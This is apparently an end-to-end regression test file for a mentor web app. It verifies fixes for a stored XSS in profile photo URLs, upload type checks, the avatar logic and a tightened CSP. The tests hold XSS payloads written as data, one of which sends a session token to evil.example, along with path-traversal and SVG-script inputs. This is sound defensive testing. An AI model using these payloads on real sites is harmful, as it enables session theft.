// ─────────────────────────────────────────────
// frea — profile photos, initials avatars and the tightened CSP
// ─────────────────────────────────────────────
//
// Requires:  npm run server   (and a current `npm run build`, for the bundle
//                              assertions at the end)
//
//   npm run test:photo
//
// Each block here is one defect that shipped:
//
//   1. photoUrl was stored raw and interpolated into an <img src> with no
//      escape, so any mentor could plant an attribute-breakout payload that
//      ran for every visitor to browse. Session tokens are in localStorage.
//   2. Photos were base64 data: URIs inside the mentor record, which meant a
//      multi-MB string in every browse response — and could not work at all,
//      since base64 inflates past the 2MB JSON body cap for any real photo.
//   3. The illustrated avatars resolved by database id rather than by the
//      avatarId the mentor picked, and only existed for ids 1–12, so every
//      mentor who signed up wore seed mentor #1's face.
//   4. Four inline-handler-free directives: the CSP no longer needs
//      'unsafe-inline', and external pitch videos are no longer blocked.

import fs from 'fs';
import path from 'path';
import sharp from 'sharp';
import { fileURLToPath } from 'url';
import { seedIdentity } from './_identity.mjs';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const API = 'http://localhost:3001/api';

import { localOnly } from './_local-only.mjs';
localOnly(API, { suite: 'profile-photo.e2e.mjs' });

const ORIGIN = 'http://localhost:3001';
const DB = path.join(__dirname, '..', 'server', 'data.json');
const PHOTO_DIR = path.join(__dirname, '..', 'server', 'uploads', 'mentor_photos');

let pass = 0, fail = 0;
const ok = (label, cond, detail = '') => {
  if (cond) { pass++; console.log(`   ✓ ${label}`); }
  else { fail++; console.log(`   ✗ ${label}  ${detail}`); }
};
const group = (n) => console.log(`\n${n}`);

const readDb = () => JSON.parse(fs.readFileSync(DB, 'utf8'));
const codeFor = (e) => readDb().verificationTokens.find(t => t.email === e.toLowerCase())?.code || null;

async function call(method, p, { body, token } = {}) {
  const headers = {};
  if (body) headers['Content-Type'] = 'application/json';
  if (token) headers.Authorization = `Bearer ${token}`;
  const res = await fetch(`${API}${p}`, { method, headers, body: body ? JSON.stringify(body) : undefined });
  let json = null;
  try { json = await res.json(); } catch (_) { /* not every response is JSON */ }
  return { status: res.status, json };
}

async function verify(email) {
  seedIdentity(email);
  await call('POST', '/auth/send-verification', { body: { email } });
  const r = await call('POST', '/auth/verify-code', { body: { email, code: codeFor(email) } });
  return r.json.sessionToken;
}

/**
 * A real JPEG, deliberately far larger than anything the page renders.
 *
 * Noise rather than a flat colour: a solid image compresses to a few kilobytes
 * however large its dimensions, which would not exercise the size limits this
 * suite is about.
 */
async function bigJpeg(width = 2400, height = 1800) {
  const pixels = Buffer.allocUnsafe(width * height * 3);
  for (let i = 0; i < pixels.length; i++) pixels[i] = Math.floor(Math.random() * 256);
  return sharp(pixels, { raw: { width, height, channels: 3 } })
    .jpeg({ quality: 95 }).toBuffer();
}

async function uploadPhoto(token, buffer, filename = 'me.jpg', type = 'image/jpeg') {
  const form = new FormData();
  form.append('photo', new Blob([buffer], { type }), filename);
  const res = await fetch(`${API}/upload/mentor-photo`, {
    method: 'POST', headers: { Authorization: `Bearer ${token}` }, body: form
  });
  let json = null;
  try { json = await res.json(); } catch (_) { /* ignore */ }
  return { status: res.status, json };
}

const latestBundle = () => {
  const dir = path.join(__dirname, '..', 'dist', 'assets');
  const js = fs.readdirSync(dir).filter(f => f.endsWith('.js'))
    .map(f => ({ f, t: fs.statSync(path.join(dir, f)).mtimeMs }))
    .sort((a, b) => b.t - a.t)[0];
  return fs.readFileSync(path.join(dir, js.f), 'utf8');
};

const stamp = Date.now();
console.log('\nPROFILE PHOTOS');

const token = await verify(`photo.mentor.${stamp}@ed.ac.uk`);
const applied = await call('POST', '/mentors/apply', {
  token,
  body: { name: 'Photo Test Mentor', university: 'University of Leeds', major: 'BSc Chemistry', year: '3rd year' }
});
const mentorToken = applied.json.sessionToken;
const mentorId = applied.json.mentor.id;
ok('test mentor created', applied.status === 201, JSON.stringify(applied.json).slice(0, 140));

// ── Defect 1: photoUrl was a stored XSS sink ─────────────────────────────
group("DEFECT 1 — photoUrl reached an <img src> unescaped and unsanitised");
{
  // The payload that made it exploitable: it passes the old startsWith('http')
  // guard, then closes the src attribute and opens an event handler.
  const breakout = 'http://x" onerror="fetch(\'https://evil.example/\'+localStorage.frea_session)';

  const saved = await call('PUT', `/mentors/${mentorId}`, {
    token: mentorToken, body: { photoUrl: breakout }
  });
  ok('an attribute-breakout photoUrl is refused on write',
    saved.json.data.photoUrl === '', JSON.stringify(saved.json.data.photoUrl));

  for (const hostile of [
    'javascript:alert(1)',
    'data:image/svg+xml,<svg onload=alert(1)>',
    'https://evil.example/tracker.gif',
    '/uploads/mentor_photos/../../data.json',
    '/uploads/mentor_photos/photo-999-1-deadbeef.webp.svg'
  ]) {
    const r = await call('PUT', `/mentors/${mentorId}`, { token: mentorToken, body: { photoUrl: hostile } });
    ok(`refused: ${hostile.slice(0, 44)}`, r.json.data.photoUrl === '', r.json.data.photoUrl);
  }

  const bundle = latestBundle();
  ok('the renderer no longer interpolates a photo URL unescaped',
    !bundle.includes('<img src="${resolvedPhoto}"'));
}

// ── Defect 2: photos lived in the record as base64 ───────────────────────
group('DEFECT 2 — photos were base64 in the record, and too big to post');
{
  const source = await bigJpeg();
  ok('the source photo is larger than the old JSON body cap',
    source.length > 2 * 1024 * 1024, `${(source.length / 1024 / 1024).toFixed(1)}MB`);

  const up = await uploadPhoto(mentorToken, source);
  ok('a multi-megabyte photo uploads', up.status === 200, JSON.stringify(up.json).slice(0, 140));

  const photoUrl = up.json?.photoUrl || '';
  ok('the stored value is a path, not a data: URI',
    /^\/uploads\/mentor_photos\/photo-\d+-\d+-[0-9a-f]{8}\.webp$/.test(photoUrl), photoUrl);
  ok('the filename carries its owner', photoUrl.includes(`photo-${mentorId}-`), photoUrl);
  ok('the upload attaches itself to the profile', up.json?.attached === true);

  const onDisk = path.join(PHOTO_DIR, path.basename(photoUrl));
  ok('the file exists on the volume', fs.existsSync(onDisk), onDisk);

  // From a buffer, not the path: sharp keeps a libvips handle on a file it
  // opens itself, which on Windows blocks the unlink asserted further down.
  const meta = await sharp(fs.readFileSync(onDisk)).metadata();
  ok('it is re-encoded to WebP', meta.format === 'webp', String(meta.format));
  ok('it is downscaled to 512px square',
    meta.width === 512 && meta.height === 512, `${meta.width}x${meta.height}`);
  ok('the stored file is a fraction of the original',
    fs.statSync(onDisk).size < source.length / 10,
    `${fs.statSync(onDisk).size} vs ${source.length}`);

  const served = await fetch(`${ORIGIN}${photoUrl}`);
  ok('it is publicly servable, like a pitch video', served.status === 200, String(served.status));
  ok('served as an image', (served.headers.get('content-type') || '').includes('image/webp'),
    served.headers.get('content-type'));
  // Drain it. An unread body leaves the connection — and on Windows the
  // server's handle on the file — open, which then blocks the unlink below.
  const bytes = Buffer.from(await served.arrayBuffer());
  ok('the served bytes are the WebP on disk', bytes.equals(fs.readFileSync(onDisk)),
    `${bytes.length} vs ${fs.statSync(onDisk).size}`);

  // The browse payload is what used to carry the blob for every visitor.
  const browse = await call('GET', '/mentors');
  const inline = browse.json.data.filter(m => String(m.photoUrl || '').startsWith('data:'));
  ok('no mentor in the browse payload carries an inline photo', inline.length === 0,
    `${inline.length} still inline`);

  // Replacing reclaims the file the old one used, or the volume data.json
  // lives on fills up with abandoned photos.
  const replacement = await uploadPhoto(mentorToken, await bigJpeg(800, 800));
  ok('replacing the photo succeeds', replacement.status === 200);
  ok('the replaced file is deleted', !fs.existsSync(onDisk), onDisk);

  const second = path.join(PHOTO_DIR, path.basename(replacement.json.photoUrl));
  const removed = await fetch(`${API}/upload/mentor-photo`, {
    method: 'DELETE', headers: { Authorization: `Bearer ${mentorToken}` }
  });
  ok('the photo can be removed', removed.status === 200);
  ok('removal deletes the file too', !fs.existsSync(second), second);

  const after = await call('GET', `/mentors/${mentorId}`);
  ok('the profile falls back to no photo', !after.json.data.photoUrl, after.json.data.photoUrl);
}

// ── Ownership: one mentor must not be able to claim another's photo ──────
group("DEFECT 1b — a photo path is checked against its owner, not just its shape");
{
  const otherToken = await verify(`photo.other.${stamp}@ed.ac.uk`);
  const otherApplied = await call('POST', '/mentors/apply', {
    token: otherToken,
    body: { name: 'Other Photo Mentor', university: 'University of Leeds', major: 'BA Law', year: '2nd year' }
  });
  const otherMentorToken = otherApplied.json.sessionToken;
  const otherId = otherApplied.json.mentor.id;

  const victim = await uploadPhoto(mentorToken, await bigJpeg(600, 600));
  const victimUrl = victim.json.photoUrl;
  const victimFile = path.join(PHOTO_DIR, path.basename(victimUrl));

  // Pointing at it is refused on write: the shape is valid but the id is not
  // theirs, and safePhotoUrl only lets through a name this mentor could mint.
  const claim = await call('PUT', `/mentors/${otherId}`, {
    token: otherMentorToken, body: { photoUrl: victimUrl }
  });
  ok('a mentor cannot point their profile at another mentor\'s photo',
    claim.json.data.photoUrl !== victimUrl, claim.json.data.photoUrl);

  // And deleting their own photo must not reach the other mentor's file.
  await fetch(`${API}/upload/mentor-photo`, {
    method: 'DELETE', headers: { Authorization: `Bearer ${otherMentorToken}` }
  });
  ok('deleting one mentor\'s photo leaves the other\'s alone',
    fs.existsSync(victimFile), victimFile);

  await fetch(`${API}/upload/mentor-photo`, {
    method: 'DELETE', headers: { Authorization: `Bearer ${mentorToken}` }
  });
}

// ── Upload gate ──────────────────────────────────────────────────────────
group('Uploads are authenticated and typed');
{
  const anon = await fetch(`${API}/upload/mentor-photo`, { method: 'POST', body: new FormData() });
  ok('anonymous upload refused', anon.status === 401 || anon.status === 403, String(anon.status));

  const notImage = new FormData();
  notImage.append('photo', new Blob([Buffer.from('#!/bin/sh\necho hi')], { type: 'application/x-sh' }), 'nope.sh');
  const shell = await fetch(`${API}/upload/mentor-photo`, {
    method: 'POST', headers: { Authorization: `Bearer ${mentorToken}` }, body: notImage
  });
  ok('a shell script is refused', shell.status === 400, String(shell.status));

  // An SVG is an image that can carry script, and these are served from our
  // own origin, so it is excluded by name rather than left to the re-encode.
  const svg = new FormData();
  svg.append('photo', new Blob([Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>')],
    { type: 'image/svg+xml' }), 'x.svg');
  const svgRes = await fetch(`${API}/upload/mentor-photo`, {
    method: 'POST', headers: { Authorization: `Bearer ${mentorToken}` }, body: svg
  });
  ok('an SVG is refused', svgRes.status === 400, String(svgRes.status));

  // Bytes are what count, not the label: sharp is the real gate.
  const liar = new FormData();
  liar.append('photo', new Blob([Buffer.from('MZ not really a picture')], { type: 'image/png' }), 'x.png');
  const liarRes = await fetch(`${API}/upload/mentor-photo`, {
    method: 'POST', headers: { Authorization: `Bearer ${mentorToken}` }, body: liar
  });
  ok('a renamed non-image is refused', liarRes.status === 400, String(liarRes.status));
}

// ── Defect 3: the illustrated avatars ────────────────────────────────────
group('DEFECT 3 — avatars were assigned by database id, not chosen');
{
  const browse = await call('GET', '/mentors');
  const withAvatarId = browse.json.data.filter(m => m.avatarId !== undefined);
  ok('avatarId is gone from the mentor payload', withAvatarId.length === 0,
    `${withAvatarId.length} still carry it`);

  const stored = readDb().mentors.filter(m => m.avatarId !== undefined);
  ok('and gone from the stored records', stored.length === 0, `${stored.length} still carry it`);

  const bundle = latestBundle();
  ok('the twelve illustrations are not in the bundle', !bundle.includes('MENTOR_AVATARS'));
  ok('initials are rendered instead', bundle.includes('mentor-initials'));
}

// ── Defect 4: the CSP ────────────────────────────────────────────────────
group('DEFECT 4 — the CSP can finally defend against injected script');
{
  const res = await fetch(ORIGIN);
  const csp = res.headers.get('content-security-policy') || '';
  const directive = (name) =>
    csp.split(';').map(d => d.trim()).find(d => d.startsWith(`${name} `)) || '';

  ok('script-src no longer allows inline script',
    directive('script-src') === "script-src 'self'", directive('script-src'));

  // Every external pitch video was a blank box: renderPitchVideoEmbed builds
  // iframes for these three and frame-src was 'none'.
  const frameSrc = directive('frame-src');
  for (const host of ['youtube-nocookie.com', 'loom.com', 'drive.google.com']) {
    ok(`frame-src allows ${host}`, frameSrc.includes(host), frameSrc);
  }
  ok('frame-src is still an allow-list, not open', !frameSrc.includes('*'), frameSrc);
  ok('frame-ancestors still denies embedding',
    directive('frame-ancestors').includes("'none'"), directive('frame-ancestors'));

  // The reason script-src can be tightened at all.
  const appSource = fs.readFileSync(path.join(__dirname, '..', 'src', 'main.js'), 'utf8')
    // Drop comments, which discuss the old attributes by name.
    .replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*(\/\/|\*).*$/gm, '');
  const indexSource = fs.readFileSync(path.join(__dirname, '..', 'index.html'), 'utf8');
  const inlineHandler = /\son(click|change|input|submit|load|error|focus|blur|keyup|keydown)\s*=/;

  ok('no inline handlers left in src/main.js', !inlineHandler.test(appSource),
    (appSource.match(inlineHandler) || [])[0]);
  ok('none in index.html either', !inlineHandler.test(indexSource),
    (indexSource.match(inlineHandler) || [])[0]);
  ok('behaviour is wired by data-action', appSource.includes('data-action='));
}

console.log(`\n═══ ${pass} passed, ${fail} failed ═══\n`);
process.exit(fail > 0 ? 1 : 0);
